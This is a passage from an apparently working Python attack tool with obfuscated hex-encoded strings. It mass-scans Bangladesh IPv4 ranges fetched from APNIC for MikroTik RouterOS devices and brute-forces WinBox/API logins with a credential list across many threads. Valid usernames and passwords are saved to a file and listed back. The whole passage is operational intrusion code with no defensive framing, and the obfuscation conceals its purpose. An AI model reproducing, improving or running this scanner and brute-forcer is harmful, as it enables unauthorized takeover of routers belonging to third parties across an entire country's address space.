    print(_s(_z('7a7a', 90), _z('', 90)) + _s(_z('b8cfcb7a7a7a0e3535367a7a7a607a0d6217333128352e333118282f2e3f7a0c6b7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7ab8cfcb', 90), C))
    print(_s(_z('7a7a', 90), _z('', 90)) + _s(_z('b8cfcb7a7a7a19283f3e332e7a607a0d6209151013187a267a0d620e3f3b377a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7ab8cfcb', 90), C))
    print(_s(_z('7a7a', 90), _z('', 90)) + _s(_z('b8cfcb7a7a7a1f343d33343f7a607a0d33343835227a18282f2e3f7a1c3528393f7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7ab8cfcb', 90), C))
    _mode = _s(_z('1c2f36367a0e32283f3b3e297a267a1c2f36367a0a352d3f28', 90), g) if not _is_termux() else _s(_z('1c2f36367a0e32283f3b3e297a267a0e3f28372f227a1511', 90), g)
    print(_s(_z('7a7a', 90), _z('', 90)) + _s(_z('b8cfcb7a7a7a17353e3f7a7a7a607a', 90), C) + _mode + _s(_z('7a7a7a7a7a7a7a7a7a7a7a7a7a7ab8cfcb', 90), C))
    print(_s(_z('7a7a', 90), _z('', 90)) + _s(_z('b8cfc0b8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfc7', 90), C))
    print(_s(_z('7a7a017a', 90), D) + _s(_z('192e283671007a0a3b2f293f', 90), c) + _s(_z('7a267a', 90), D) + _s(_z('1f342e3f287a0f342a3b2f293f', 90), c) + _s(_z('7a267a', 90), D) + _s(_z('192e283671197a092e352a', 90), X) + _s(_z('7a07', 90), D))
    print(_z('', 90))

def print_system_info():
    info = _get_system_info()
    print(_s(_z('7a7a7777777a0923292e3f377a777777', 90), G))
    print(_s(_z('7a7a', 90), D) + _s(_z('0d161b147a757a1635393b367a130a7a607a', 90), C) + _s(_z('2127', 90).format(info.get(_z('3635393b3605332a', 90)) or _z('b8dace', 90)), g))
    print(_s(_z('7a7a', 90), D) + _s(_z('1235292e343b373f7a7a7a7a7a7a7a7a607a', 90), C) + _s(_z('2127', 90).format(info.get(_z('3235292e343b373f', 90), _z('b8dace', 90))), g))
    print(_s(_z('7a7a', 90), D) + _s(_z('0a232e3235347a7a7a7a7a7a7a7a7a7a607a', 90), C) + _s(_z('2127', 90).format(info.get(_z('2a232e323534', 90), _z('b8dace', 90))), g))
    print(_s(_z('7a7a', 90), D) + _s(_z('0a363b2e3c3528377a7a7a7a7a7a7a7a607a', 90), C) + _s(_z('2127', 90).format(info.get(_z('2a363b2e3c352837', 90), _z('b8dace', 90))), g))
    if info.get(_z('2e3f28372f22', 90)):
        print(_s(_z('7a7a', 90), D) + _s(_z('1f342c33283534373f342e7a7a7a7a7a607a', 90), C) + _s(_z('0e3f28372f22', 90), g))
    print(_z('', 90))

def main():
    if hasattr(signal, _z('09131d0e090e0a', 90)):
        try:
            signal.signal(signal.SIGTSTP, _sigtstp_handler)
        except Exception:
            pass
    installed = _ensure_requirements()
    if installed:
        try:
            print(_s(_z('083f2b2f33283f373f342e29607a3334292e3b36363f3e7a', 90), G) + _s(_z('767a', 90).join(installed), c) + _s(_z('7a72151173', 90), G))
        except Exception:
            print(_z('083f2b2f33283f373f342e29607a3334292e3b36363f3e7a', 90) + _z('767a', 90).join(installed) + _z('7a72151173', 90))
    # Never delete this file on relaunch; keep all valid MikroTik data
    try:
        with open(BRUTEFORCE_OUT_FILE, "a", encoding="utf-8"):
            pass
    except Exception:
        pass
    parser = argparse.ArgumentParser(description=_z('17333128350e33317a39323f39313f287a720d3334383522767a1b0a13767a09091273747a0e3f28372f227a151174', 90))
    parser.add_argument(_z('3235292e', 90), nargs=_z('65', 90), default=None, help=_z('130a7a35287a3235292e602a35282e7a723f743d747a686a6974636f74686869746b6b6360686a686f73617a333c7a3537332e2e3f3e767a23352f7a2d3336367a383f7a3b29313f3e', 90))
    parser.add_argument(_z('772f', 90), _z('77772f293f28343b373f', 90), default=None, help=_z('0f293f28343b373f7a72333c7a293f2e7a2d332e327a772a767a2933343d363f7a39323f3931617a3f36293f7a2f293f7a0f293f280a3b29297a3c33363f73', 90))
    parser.add_argument(_z('772a', 90), _z('77772a3b29292d35283e', 90), default=None, help=_z('0a3b29292d35283e', 90))
    parser.add_argument(_z('773c', 90), _z('77772f293f282a3b2929', 90), default=_z('0f293f280a3b2929742e222e', 90), help=_z('0f293f28602a3b29297a3c33363f7a723e3f3c3b2f362e607a0f293f280a3b2929742e222e73', 90))
    parser.add_argument(_z('77773b2a33772a35282e', 90), type=int, default=None, help=_z('1b0a137a2a35282e7a723e3f3c3b2f362e7a626d686273', 90))
    parser.add_argument(_z('7777292932772a35282e', 90), type=int, default=22, help=_z('0909127a2a35282e', 90))
    parser.add_argument(_z('77772931332a773b2a33', 90), action=_z('292e35283f052e282f3f', 90), help=_z('0931332a7a1b0a137a39323f3931', 90))
    parser.add_argument(_z('77772931332a77292932', 90), action=_z('292e35283f052e282f3f', 90), help=_z('0931332a7a0909127a39323f3931', 90))
    parser.add_argument(_z('77772e33373f352f2e', 90), type=float, default=5.0, help=_z('0e33373f352f2e7a72293f3935343e2973', 90))
    parser.add_argument(_z('777729393b34772a35282e29', 90), action=_z('292e35283f052e282f3f', 90), help=_z('1c2f36367a0e190a7a2a35282e7a29393b347a6a776c6f6f696f7a35347a3235292e767a2e323f347a3f22332e', 90))
    args = parser.parse_args()
    host = args.host
    interactive = host is None or host == _z('', 90)
    while True:
        if host is None or host == _z('', 90):
            print_banner()
            print_system_info()
            print(_s(_z('7a7a016b07', 90), C) + _z('7a7a0933343d363f7a130a', 90))
        print(_s(_z('7a7a016807', 90), C) + _z('7a7a143528373b367a18282f2e3f1c3528393f7a130a7a', 90) + _s(_z('723e3f3c3b2f362e7a2a35282e2973', 90), D))
        print(_s(_z('7a7a016907', 90), C) + _z('7a7a1e3f3f2a7a18282f2e3f1c3528393f7a130a7a', 90) + _s(_z('723b36367a2a35282e297a6a776c6f6f696f73', 90), D))
        print(_s(_z('7a7a016e07', 90), C) + _z('7a7a183b343d363b3e3f29327a1b16167a083b343e35377a130a7a', 90) + _s(_z('721b0a1413197a717a29393b347a717a36353d333473', 90), D))
        print(_s(_z('7a7a016f07', 90), C) + "  Mikrotik Web Finder " + _s("(APNIC + scan 80,8080 + RouterOS title)", D))
        print(_s(_z('7a7a016c07', 90), C) + _z('7a7a0932352d7a1b36367a16151d13147a1c150f141e', 90))
        print(_s(_z('7a7a016d07', 90), C) + _z('7a7a1f22332e', 90))
        choice = input(_s("  Select (1-7): ", Y)).strip() or _z('6b', 90)
        if choice == _z('6d', 90):
            print(_s(_z('7a7a18233f74', 90), D))
            sys.exit(0)
        if choice == _z('6f', 90):
            print("")
            print(_s("--- Mikrotik Web Finder (APNIC + scan 80,8080 + RouterOS title) ---", G))
            print(_s("  Fetching APNIC (Bangladesh IPv4 only)...", D))
            ranges, err = fetch_apnic_bangladesh_ranges()
            if err or not ranges:
                print(_s("  Error: ", X) + _s("{}".format(err or "No Bangladesh ranges found"), X))
                continue
            total_ips = sum((end - start + 1 for start, end in ranges))
            ok, err = save_bangladesh_ranges(ranges)
            if not ok:
                print(_s("  Error saving ", X) + BANGLADESH_IP_FILE + _s(": {}".format(err), X))
                continue
            print(_s("  Saved ", G) + _s("{}".format(len(ranges)), C) + _s(" ranges (", D) + _s("{}".format(total_ips), C) + _s(" IPs). Scanning ports 80, 8080 for RouterOS web...", D))
            print("")
            detected = set()
            out_file = MIKROTIK_WEB_FILE
            _to, _wo = _scan_tuning()
            num_ranges = len(ranges)
            for idx, (start_int, end_int) in enumerate(ranges, 1):
                _check_pause_and_stop()
                start_ip = _int_to_ip(start_int)
                end_ip = _int_to_ip(end_int)
                range_ips = end_int - start_int + 1
                print(_s("  [{}/{}] ".format(idx, num_ranges), D) + _s(start_ip, c) + _s(" - ", D) + _s(end_ip, c) + _s(" ({} IPs)...".format(range_ips), D), flush=True)
                found = scan_range_default_ports(start_int, end_int, ports=WEB_SCAN_PORTS, timeout=_to, max_workers=_wo)
                for ip, ports in found:
                    for port in ports:
                        if (ip, port) in detected:
                            continue
                        if check_web_routeros(ip, port, timeout=min(_to * 2, 4.0)):
                            detected.add((ip, port))
                            line = "{}:{}\n".format(ip, port)
                            with open(out_file, "a", encoding="utf-8") as f:
                                f.write(line)
                            print(_s("    -> RouterOS web: ", G) + _s("{}:{}".format(ip, port), g) + _s(" (saved)", D), flush=True)
                print(_s("    Total found so far: ", C) + _s("{}".format(len(detected)), G) + _s(" (saved to {})".format(out_file), D), flush=True)
            print("")
            print(_s("--- Mikrotik Web Finder done ---", G))
            print(_s("  Total RouterOS web: ", C) + _s("{}".format(len(detected)), G) + _s("  (saved to ", D) + _s(out_file, g) + _s(")", D))
            print("")
            continue
        if choice == _z('6c', 90):
            if not os.path.isfile(BRUTEFORCE_OUT_FILE):
                print(_s(_z('7a7a14357a3c33363f607a', 90), X) + _z('2127', 90).format(BRUTEFORCE_OUT_FILE) + _s(_z('747a082f347a18282f2e3f1c3528393f7a3c3328292e74', 90), D))
                sys.exit(0)
            print(_z('', 90))
            print(_s(_z('7777777a1b36367a16151d13147a1c150f141e7a72', 90), G) + _s(BRUTEFORCE_OUT_FILE, c) + _s(_z('737a777777', 90), G))
            with open(BRUTEFORCE_OUT_FILE, _z('28', 90), encoding=_z('2f2e3c7762', 90), errors=_z('283f2a363b393f', 90)) as f:
                lines = [l.strip() for l in f if l.strip()]
            if not lines:
                print(_s(_z('7a7a723f372a2e2373', 90), D))
            else:
                for i, line in enumerate(lines, 1):
                    print(_s(_z('7a7a21277a7a', 90).format(i), C) + _s(line, g))
            print(_s(_z('7a7a0e352e3b36607a', 90), C) + _s(_z('2127', 90).format(len(lines)), G) + _s(_z('7a36353d333429', 90), D))
            print(_z('', 90))
            continue
        if choice == _z('6e', 90):
            print(_z('', 90))
            web_lines = []
            if os.path.isfile(MIKROTIK_WEB_FILE):
                with open(MIKROTIK_WEB_FILE, "r", encoding="utf-8", errors="replace") as f:
                    web_lines = [l.strip() for l in f if l.strip()]
            sel = ""
            if web_lines:
                bangladesh_lines = 0
                if os.path.isfile(BANGLADESH_IP_FILE):
                    with open(BANGLADESH_IP_FILE, "r", encoding="utf-8", errors="replace") as bf:
                        bangladesh_lines = sum(1 for _ in bf if _.strip())
                print(_s("  Select:", G))
                print(_s("  1.", C) + _s("MikrotikWebFound.txt", g) + _s(" ({} lines)".format(len(web_lines)), D))
                print(_s("  2.", C) + _s("BangladeshIP.txt", g) + _s(" ({} lines)".format(bangladesh_lines), D))
                print("")
                sel = input(_s("  Select (1 / 2 / Enter = full Bangladesh scan): ", Y)).strip()
                print("")
            print(_s(_z('7777777a183b343d363b3e3f29327a1b16167a083b343e35377a130a7a777777', 90), G))
            pairs, err = load_userpass(args.userpass)
            if err or not pairs:
                print(_s(_z('193b3434352e7a36353b3e7a', 90), X) + _z('2127', 90).format(args.userpass) + _s(_z('7a3c35287a36353d33347a2e282374', 90), D))
                sys.exit(2)
            out_file = BRUTEFORCE_OUT_FILE
            try_timeout = min(args.timeout, 2.5)
            if sel == _z('6b', 90):
                seen_ip = set()
                ip_list = []
                for line in web_lines:
                    if ":" in line:
                        parts = line.rsplit(":", 1)
                        if len(parts) == 2 and parts[1].isdigit():
                            ip = parts[0].strip()
                            if ip and ip not in seen_ip:
                                seen_ip.add(ip)
                                ip_list.append(ip)
                _to, _wo = _scan_tuning()
                scan_ports = [8080, 8291, 8728, 8729, 2025, 10001]
                try_ports_set = {8080, 8291, 8728, 8729}
                print(_s("  Fast scan each IP (ports 8080,8291,8728,8729,2025,10001), then when 8080/8291/8728/8729 open -> try ", G) + _s("{}".format(len(pairs)), C) + _s(" credentials", D))
                print("")
                total_valid = 0
                for ip in ip_list:
                    _check_pause_and_stop()
                    open_ports = [p for p in scan_ports if check_port(ip, p, min(_to, 0.5))]
                    if not open_ports:
                        continue
                    if not (try_ports_set & set(open_ports)):
                        continue
                    print(_s("  --- ", G) + _s(ip, c) + _s(" ---", D) + _s("  open: ", D) + _s(",".join(str(p) for p in open_ports), g), flush=True)
                    print(_s("       --- Credentials --- ", G) + _s(ip, c) + _s("  ", D) + _s("{}".format(len(pairs)), C) + _s(" credentials", D), flush=True)
                    try:
                        n = _try_credentials_one_ip(ip, open_ports, pairs, out_file, try_timeout=try_timeout, max_workers=100)
                        total_valid += n
                    except KeyboardInterrupt:
                        print(_s(_z('50092e352a2a3f3e74', 90), Y))
                        sys.exit(130)
                    except ImportError:
                        print(_s(_z('7a7a3f393e293b7a283f2b2f33283f3e607a2a332a7a3334292e3b36367a3f393e293b', 90), X))
                        sys.exit(2)
                    print(_s("       Total valid saved so far: ", C) + _s("{}".format(total_valid), G) + _s("  (", D) + _s(out_file, g) + _s(")", D), flush=True)
                print("")
                print(_s("--- MikrotikWebFound login done ---", G))
                print(_s("  Valid found: ", C) + _s("{}".format(total_valid), G) + _s(" (saved to ", D) + _s(out_file, g) + _s(")", D))
                print("")
                continue
            if sel == _z('68', 90):
                ranges, err = load_bangladesh_ranges()
                if err or not ranges:
                    print(_s("  Error loading ", X) + BANGLADESH_IP_FILE + _s(": {}".format(err or "empty or invalid"), X))
                    continue
                total_ips = sum((end - start + 1 for start, end in ranges))
                print(_s("  Using ", G) + _s("{}".format(len(ranges)), C) + _s(" ranges (", D) + _s("{}".format(total_ips), C) + _s(" IPs) from ", D) + _s(BANGLADESH_IP_FILE, g))
                print(_s(_z('7a7a09393b347a717a283f3b36772e33373f7a36353d3334607a2d323f347a130a7a323b297a', 90), D) + _s(_z('626a626a767a6268636b767a626d6862767a626d6863', 90), c) + _s(_z('7a352a3f347a77647a2e28237a', 90), D) + _s(_z('2127', 90).format(len(pairs)), C) + _s(_z('7a39283f3e3f342e333b3629767a293b2c3f7a2c3b36333e7a2e357a', 90), D) + _s(out_file, g))
                print(_z('', 90))
                total_valid = 0
                num_ranges = len(ranges)
                _to, _wo = _scan_tuning()
                for idx, (start_int, end_int) in enumerate(ranges, 1):
                    _check_pause_and_stop()
                    range_ips = end_int - start_int + 1
                    start_ip = _int_to_ip(start_int)
                    end_ip = _int_to_ip(end_int)
                    print(_s(_z('7a7a01', 90), D) + _s(_z('2127', 90).format(idx), C) + _s(_z('75', 90), D) + _s(_z('2127', 90).format(num_ranges), C) + _s(_z('077a', 90), D) + _s(start_ip, c) + _s(_z('7a777a', 90), D) + _s(end_ip, c) + _s(_z('7a7a72', 90), D) + _s(_z('2127', 90).format(range_ips), Y) + _s(_z('7a130a29737a', 90), D) + _s(_z('747474', 90), D), flush=True)
                    found = scan_range_default_ports(start_int, end_int, timeout=_to, max_workers=_wo)
                    if found:
                        ips_str = _z('767a', 90).join((ip for ip, _ in found[:8]))
                        if len(found) > 8:
                            ips_str += _z('7a7121277a3735283f', 90).format(len(found) - 8)
                        print(_s(_z('7a7a7a7a7a7a7a77647a', 90), G) + _s(_z('2127', 90).format(len(found)), G) + _s(_z('7a35343633343f607a', 90), D) + _s(ips_str, g), flush=True)
                    for ip, ports in found:
                        _check_pause_and_stop()
                        if not WINBOX_TRY_PORTS & set(ports):
                            continue
                        print(_s(_z('7a7a7a7a7a7a7a7777777a19283f3e3f342e333b36297a7777777a', 90), G) + _s(ip, c) + _s(_z('7a7a', 90), D) + _s(_z('2127', 90).format(len(pairs)), C) + _s(_z('7a39283f3e3f342e333b3629', 90), D), flush=True)
                        try:
                            n = _try_credentials_one_ip(ip, ports, pairs, out_file, try_timeout=try_timeout, max_workers=100)
                            total_valid += n
                        except KeyboardInterrupt:
                            print(_s(_z('50092e352a2a3f3e74', 90), Y))
                            sys.exit(130)
                        except ImportError:
                            print(_s(_z('7a7a3f393e293b7a283f2b2f33283f3e607a2a332a7a3334292e3b36367a3f393e293b', 90), X))
                            sys.exit(2)
                    print(_s(_z('7a7a7a7a7a7a7a0e352e3b367a2c3b36333e7a293b2c3f3e7a29357a3c3b28607a', 90), C) + _s(_z('2127', 90).format(total_valid), G) + _s(_z('7a7a72', 90), D) + _s(out_file, g) + _s(_z('73', 90), D), flush=True)
                print(_z('', 90))
                print(_s(_z('7777777a183b343d363b3e3f29327a1b16167a3e35343f7a777777', 90), G))
                print(_s(_z('7a7a0c3b36333e7a3c352f343e607a', 90), C) + _s(_z('2127', 90).format(total_valid), G) + _s(_z('7a7a72293b2c3f3e7a2e357a', 90), D) + _s(out_file, g) + _s(_z('73', 90), D))
                print(_z('', 90))
                continue
            ranges = None
            total_ips = 0
            # If BangladeshIP.txt already exists, use it (skip APNIC download)
            if os.path.isfile(BANGLADESH_IP_FILE):
                ranges, _err = load_bangladesh_ranges()
                if ranges:
                    total_ips = sum((end - start + 1 for start, end in ranges))
                    print(_s("  Using existing ", G) + _s(BANGLADESH_IP_FILE, g) + _s(" (skip APNIC download)", D))
            if not ranges:
                print(_s(_z('7a7a1c3f2e393233343d7a1b0a1413197a', 90), D) + _s(_z('72183b343d363b3e3f29327a130a2c6e7a3534362373', 90), c) + _s(_z('747474', 90), D))
                ranges, err = fetch_apnic_bangladesh_ranges()
                if err or not ranges:
                    print(_s(_z('7a7a1f28283528607a', 90), X) + _s(_z('2127', 90).format(err or _z('14357a183b343d363b3e3f29327a283b343d3f297a3c352f343e', 90)), X))
                    sys.exit(2)
                total_ips = sum((end - start + 1 for start, end in ranges))
                ok, err = save_bangladesh_ranges(ranges)
                if not ok:
                    print(_s(_z('7a7a1f282835287a293b2c33343d7a', 90), X) + _s(BANGLADESH_IP_FILE, D) + _s(_z('607a2127', 90).format(err), X))
                    sys.exit(2)
                print(_s(_z('7a7a093b2c3f3e7a', 90), G) + _s(_z('2127', 90).format(len(ranges)), C) + _s(_z('7a283b343d3f297a72', 90), D) + _s(_z('2127', 90).format(total_ips), C) + _s(_z('7a130a29737a2e357a', 90), D) + _s(BANGLADESH_IP_FILE, g))
            print(_s(_z('7a7a09393b347a717a283f3b36772e33373f7a36353d3334607a2d323f347a130a7a323b297a', 90), D) + _s(_z('626a626a767a6268636b767a626d6862767a626d6863', 90), c) + _s(_z('7a352a3f347a77647a2e28237a', 90), D) + _s(_z('2127', 90).format(len(pairs)), C) + _s(_z('7a39283f3e3f342e333b3629767a293b2c3f7a2c3b36333e7a2e357a', 90), D) + _s(out_file, g))
            print(_z('', 90))
            total_valid = 0
            num_ranges = len(ranges)
            _to, _wo = _scan_tuning()
            for idx, (start_int, end_int) in enumerate(ranges, 1):
                _check_pause_and_stop()
                range_ips = end_int - start_int + 1
                start_ip = _int_to_ip(start_int)
                end_ip = _int_to_ip(end_int)
                print(_s(_z('7a7a01', 90), D) + _s(_z('2127', 90).format(idx), C) + _s(_z('75', 90), D) + _s(_z('2127', 90).format(num_ranges), C) + _s(_z('077a', 90), D) + _s(start_ip, c) + _s(_z('7a777a', 90), D) + _s(end_ip, c) + _s(_z('7a7a72', 90), D) + _s(_z('2127', 90).format(range_ips), Y) + _s(_z('7a130a29737a', 90), D) + _s(_z('747474', 90), D), flush=True)
                found = scan_range_default_ports(start_int, end_int, timeout=_to, max_workers=_wo)
                if found:
                    ips_str = _z('767a', 90).join((ip for ip, _ in found[:8]))
                    if len(found) > 8:
                        ips_str += _z('7a7121277a3735283f', 90).format(len(found) - 8)
                    print(_s(_z('7a7a7a7a7a7a7a77647a', 90), G) + _s(_z('2127', 90).format(len(found)), G) + _s(_z('7a35343633343f607a', 90), D) + _s(ips_str, g), flush=True)
                for ip, ports in found:
                    _check_pause_and_stop()
                    if not WINBOX_TRY_PORTS & set(ports):
                        continue
                    print(_s(_z('7a7a7a7a7a7a7a7777777a19283f3e3f342e333b36297a7777777a', 90), G) + _s(ip, c) + _s(_z('7a7a', 90), D) + _s(_z('2127', 90).format(len(pairs)), C) + _s(_z('7a39283f3e3f342e333b3629', 90), D), flush=True)
                    try:
                        n = _try_credentials_one_ip(ip, ports, pairs, out_file, try_timeout=try_timeout, max_workers=100)
                        total_valid += n
                    except KeyboardInterrupt:
                        print(_s(_z('50092e352a2a3f3e74', 90), Y))
                        sys.exit(130)
                    except ImportError:
                        print(_s(_z('7a7a3f393e293b7a283f2b2f33283f3e607a2a332a7a3334292e3b36367a3f393e293b', 90), X))
                        sys.exit(2)
                print(_s(_z('7a7a7a7a7a7a7a0e352e3b367a2c3b36333e7a293b2c3f3e7a29357a3c3b28607a', 90), C) + _s(_z('2127', 90).format(total_valid), G) + _s(_z('7a7a72', 90), D) + _s(out_file, g) + _s(_z('73', 90), D), flush=True)
            print(_z('', 90))
            print(_s(_z('7777777a183b343d363b3e3f29327a1b16167a3e35343f7a777777', 90), G))
            print(_s(_z('7a7a0c3b36333e7a3c352f343e607a', 90), C) + _s(_z('2127', 90).format(total_valid), G) + _s(_z('7a7a72293b2c3f3e7a2e357a', 90), D) + _s(out_file, g) + _s(_z('73', 90), D))
            print(_z('', 90))
            continue
        if choice in (_z('68', 90), _z('69', 90)):
            start_str = input(_s(_z('7a7a1f342e3f287a130a7a283b343d3f7a092e3b282e607a', 90), Y)).strip()
            end_str = input(_s(_z('7a7a1f342e3f287a1f343e607a', 90), Y)).strip()
            start_int = _ip_to_int(start_str)
            end_int = _ip_to_int(end_str)
            if start_int is None or end_int is None:
                print(_s(_z('7a7a13342c3b36333e7a130a747a0f293f7a3c3528373b2e7a1b74187419741e7a723f743d747a6b6a69746b6b68746e68746b73', 90), X))
                sys.exit(2)
            if start_int > end_int:
                print(_s(_z('7a7a092e3b282e7a130a7a372f292e7a383f7a363f29297a2e323b347a35287a3f2b2f3b367a2e357a1f343e7a130a74', 90), X))
                sys.exit(2)
            total_ips = end_int - start_int + 1
            print(_z('', 90))
            print(_s(_z('7777777a18282f2e3f1c3528393f7a130a7a777777', 90), G))
            print(_s(_z('7a7a083b343d3f607a', 90), C) + _s(_z('2127', 90).format(_int_to_ip(start_int)), g) + _s(_z('7a2e357a', 90), D) + _s(_z('2127', 90).format(_int_to_ip(end_int)), g) + _s(_z('7a7a7221277a130a2973', 90).format(total_ips), D))
            _to, _wo = _scan_tuning()
            if choice == _z('68', 90):
                print(_s(_z('7a7a19323f393133343d7a3e3f3c3b2f362e7a2a35282e297a353436237a', 90), D) + _s(_z('72212773', 90).format(_z('767a', 90).join((str(p) for p in DEFAULT_SCAN_PORTS))), c) + _s(_z('747474', 90), D))
                online_with_ports = scan_range_default_ports(start_int, end_int, timeout=_to, max_workers=_wo)
            else:
                print(_s(_z('7a7a19323f393133343d7a3b36367a2a35282e297a6a776c6f6f696f7a2a3f287a130a7a', 90), D) + _s(_z('723c2f36367a29393b3473', 90), c) + _s(_z('747474', 90), D))
                online_with_ports = scan_range_all_ports(start_int, end_int, port_timeout=_to, port_workers=_wo, ip_workers=6)
            print(_z('', 90))
            print(_s(_z('7777777a083f292f362e7a777777', 90), G))
            print(_s(_z('7a7a15343633343f607a7a', 90), C) + _s(_z('2127', 90).format(len(online_with_ports)), G) + _s(_z('7a130a29', 90), D))
            if online_with_ports:
                for ip, ports in online_with_ports:
                    print(_s(_z('7a7a7a7a', 90), D) + _s(ip, c) + _s(_z('7a7a2a35282e29607a', 90), D) + _s(_z('767a', 90).join((str(p) for p in ports)), g))
            print(_s(_z('7a7a153c3c3633343f607a', 90), D) + _s(_z('2127', 90).format(total_ips - len(online_with_ports)), D) + _s(_z('7a130a29', 90), D))
            print(_z('', 90))
            if not online_with_ports:
                sys.exit(0)
            pairs, err = load_userpass(args.userpass)
            if err or not pairs:
                print(_z('193b3434352e7a36353b3e7a21277a3c35287a36353d33347a2e282374', 90).format(args.userpass))
                sys.exit(2)
            try_timeout = min(args.timeout, 2.5)
            out_file = BRUTEFORCE_OUT_FILE
            tasks = [(ip, port, u, p) for ip, ports in online_with_ports for port in ports for u, p in pairs]
            total_tasks = len(tasks)
            max_workers = min(100, total_tasks)
            valid_found = []

            def try_brute_one(item):
                ip, port, username, password = item
                try:
                    success, _ = winbox_login(ip, username, password, port=port, timeout=try_timeout)
                    return (ip, port, username, password, success)
                except ImportError:
                    raise
                except Exception:
                    return (ip, port, username, password, False)
            print(_s(_z('7777777a0e28237a36353d33347a722c3b36333e7a17333128350e3331737a777777', 90), G))
            print(_s(_z('7a7a', 90), D) + _s(_z('2127', 90).format(len(pairs)), C) + _s(_z('7a39283f3e3f342e333b36297a227a', 90), D) + _s(_z('2127', 90).format(len(online_with_ports)), C) + _s(_z('7a130a297a227a2a35282e297a677a', 90), D) + _s(_z('2127', 90).format(total_tasks), Y) + _s(_z('7a3b2e2e3f372a2e29747a093b2c33343d7a2e357a', 90), D) + _s(out_file, g))
            print(_z('', 90))
            try:
                from concurrent.futures import ThreadPoolExecutor, as_completed
            except ImportError:
                for item in tasks:
                    ip, port, u, p = item
                    try:
                        ok = winbox_login(ip, u, p, port=port, timeout=try_timeout)[0]
                    except Exception:
                        ok = False
                    if ok:
                        print_valid_found(ip, port, u, p)
                        valid_found.append((ip, port, u, p))
                        with open(out_file, _z('3b', 90), encoding=_z('2f2e3c7762', 90)) as f:
                            f.write(_z('21276021277a7a21277a7a212750', 90).format(ip, port, u or _z('723f372a2e2373', 90), p if p else _z('723f372a2e2373', 90)))
            else:
                try:
                    with ThreadPoolExecutor(max_workers=max_workers) as ex:
                        futures = {ex.submit(try_brute_one, t): t for t in tasks}
                        done = 0
                        for fut in as_completed(futures):
                            done += 1
                            if done % 200 == 0:
                                _check_pause_and_stop()
                                print(_s(_z('7a7a0a28353d283f2929607a', 90), D) + _s(_z('2127', 90).format(done), c) + _s(_z('7a757a', 90), D) + _s(_z('2127', 90).format(total_tasks), C) + _s(_z('7a747474', 90), D))
                            try:
                                ip, port, username, password, success = fut.result()
                            except ImportError:
                                print(_z('7a7a3f393e293b7a283f2b2f33283f3e607a2a332a7a3334292e3b36367a3f393e293b', 90))
                                sys.exit(2)
                            if success:
                                print_valid_found(ip, port, username, password)
                                valid_found.append((ip, port, username, password))
                                with open(out_file, _z('3b', 90), encoding=_z('2f2e3c7762', 90)) as f:
                                    f.write(_z('21276021277a7a21277a7a212750', 90).format(ip, port, username or _z('723f372a2e2373', 90), password if password else _z('723f372a2e2373', 90)))
                except KeyboardInterrupt:
                    print(_s(_z('50092e352a2a3f3e74', 90), Y))
                    sys.exit(130)
            print(_s(_z('7777777a18282f2e3f1c3528393f7a3e35343f7a777777', 90), G))
            print(_s(_z('7a7a0c3b36333e7a3c352f343e607a', 90), C) + _s(_z('2127', 90).format(len(valid_found)), G) + _s(_z('7a7a72293b2c3f3e7a2e357a', 90), D) + _s(out_file, g) + _s(_z('73', 90), D))
            print(_z('', 90))
            continue
        host = input(_s(_z('7a7a1f342e3f287a130a607a', 90), Y)).strip()
        if not host:
            print(_s(_z('7a7a14357a130a7a3f342e3f283f3e74', 90), X))
            if interactive:
                continue
            sys.exit(2)
        if _z('60', 90) in host:
            host_for_scan = host.rsplit(_z('60', 90), 1)[0]
        else:
            host_for_scan = host
        if getattr(args, _z('29393b34052a35282e29', 90), False):
            st, sw = _scan_tuning()
            print(_s(_z('1c2f36367a0e190a7a2a35282e7a29393b347a6a776c6f6f696f7a35347a21277474747a', 90).format(host_for_scan), D) + (_s(_z('720e3f28372f2273', 90), c) if _is_termux() else _s(_z('723c2f36367a2a352d3f2873', 90), g)))
            open_ports = scan_all_open_ports(host_for_scan, timeout=min(st, args.timeout / 10), max_workers=sw)
            if open_ports:
                print(_s(_z('152a3f347a0e190a7a2a35282e297a72', 90), G) + _s(_z('2127', 90).format(len(open_ports)), C) + _s(_z('73607a', 90), G) + _s(_z('767a', 90).join((str(p) for p in open_ports)), g))
            else:
                print(_s(_z('14357a352a3f347a0e190a7a2a35282e297a3c352f343e74', 90), D))
            if interactive:
                host = None
                continue
            sys.exit(0 if open_ports else 2)
        winbox_ports_to_try = None
        if interactive:
            port_str = input(_s(_z('7a7a0a35282e7a721f342e3f287a677a3c2f36367a29393b347a6a776c6f6f696f7a2e323f347a2e28237a39283f3e3f342e333b362973607a', 90), Y)).strip().lower()
            if port_str and port_str.isdigit():
                host = host + _z('60', 90) + port_str
            else:
                st, sw = _scan_tuning()
                print(_s(_z('1c2f36367a0e190a7a2a35282e7a29393b347a6a776c6f6f696f7474747a', 90), D) + (_s(_z('720e3f28372f227a3c2f36367a2a352d3f2873', 90), c) if _is_termux() else _s(_z('723c2f36367a2a352d3f2873', 90), g)))
                scan_timeout = min(st, max(0.15, args.timeout / 10))
                open_ports = scan_all_open_ports(host, timeout=scan_timeout, max_workers=sw)
                if open_ports:
                    print(_s(_z('7a7a152a3f347a0e190a7a2a35282e297a72', 90), G) + _s(_z('2127', 90).format(len(open_ports)), C) + _s(_z('73607a', 90), G) + _s(_z('767a', 90).join((str(p) for p in open_ports)), g))
                    winbox_ports_to_try = open_ports
                    winbox_candidates = [p for p in WINBOX_PORTS if p in open_ports]
                    chosen = winbox_candidates[0] if winbox_candidates else open_ports[0]
                    host = host + _z('60', 90) + str(chosen)
                    print(_z('7a7a0d3336367a2e28237a39283f3e3f342e333b36297a35347a3b36367a21277a2a35282e297a3b2e7a3534393f74', 90).format(len(open_ports)))
                else:
                    host = host + _z('60686a686f', 90)
                    print(_z('7a7a14357a352a3f347a2a35282e297a3c352f343e767a2f2933343d7a686a686f74', 90))
        api_port = args.api_port
        if _z('60', 90) in host:
            parts = host.rsplit(_z('60', 90), 1)
